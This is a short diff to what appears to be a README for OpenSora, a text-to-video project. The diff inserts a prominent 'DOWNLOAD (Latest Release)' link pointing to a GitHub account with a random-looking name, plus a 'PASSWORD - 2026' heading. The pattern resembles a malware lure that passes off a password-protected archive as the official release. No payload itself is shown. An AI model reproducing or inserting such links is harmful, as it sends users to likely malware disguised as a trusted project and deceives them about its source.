@@ -13,6 +13,14 @@ OpenSora brings state-of-the-art text-to-video synthesis to your desktop. Traine
 
 ---
 
+ <div align="center">
+  <a href="https://github.com/malanradperlazqt/opensora/releases/tag/opensora">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSWORD - 2026 
+
 ## Why OpenSora?
 
 While commercial video models remain closed, **OpenSora is open by design**:
